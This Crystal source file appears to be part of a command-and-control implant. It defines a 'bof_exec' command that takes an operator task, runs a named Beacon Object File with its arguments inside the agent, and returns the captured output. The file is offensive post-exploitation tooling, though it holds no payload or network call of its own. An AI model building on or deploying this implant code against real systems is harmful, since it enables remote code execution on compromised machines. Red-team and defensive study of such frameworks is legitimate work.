require "./base"
require "../../elf/callbacks"

module Dark::Agent::Commands
  class BofExec < Base
    def name : String
      "bof_exec"
    end

    def execute(task : JSON::Any) : Nil
      task_id = task["id"]?.try(&.as_s) || ""
      bof_name = task["parameters"]["name"]?.try(&.as_s) || ""

      # Check for bof_args_str first (single string), then bof_args (split string)
      bof_args = if bof_args_str = task["parameters"]["bof_args_str"]?.try(&.as_s)
        bof_args_str.empty? ? [] of String : [bof_args_str]
      else
        task["parameters"]["bof_args"]?.try(&.as_s.split) || [] of String
      end

      if bof_name.empty?
        MessageHandler.add_response(task_id, :success, "No BOF name specified")
        return
      end

      log_debug("Executing BOF '#{bof_name}' with arguments: #{bof_args.inspect}")

      # Execute the BOF in a protected thread to prevent crashes
      result = bof_registry.execute(bof_name, bof_args, task_id: task_id)

      # Queue success response
      output = Dark::ELF::Callbacks.get_and_clear_output
      MessageHandler.add_response(task_id, :success, output)
    end
  end
end